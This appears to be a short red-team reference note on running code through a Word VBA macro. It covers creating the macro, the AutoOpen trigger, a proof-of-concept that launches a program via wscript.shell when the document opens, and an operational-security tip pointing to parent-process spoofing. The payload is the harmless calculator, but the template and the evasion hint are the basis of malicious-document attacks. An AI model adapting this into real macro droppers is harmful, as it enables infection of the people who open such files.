# VBA
You can create a macro in a Word document by going to **View > Macros > Create**.  Change the "Macros in" field from "All active templates and documents" to "Document 1".

Trigger Functions
* AutoOpen


PoC.vb
``````vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
``````

#OPSEC Word spawning a process highly suspicious [[Parent-Process-Spoofing (PPS)]]


## Tools
########
########

```meta
ttp: T1000
internal: false
requirements: 
results: user, admin
description: VBA execution via Office
```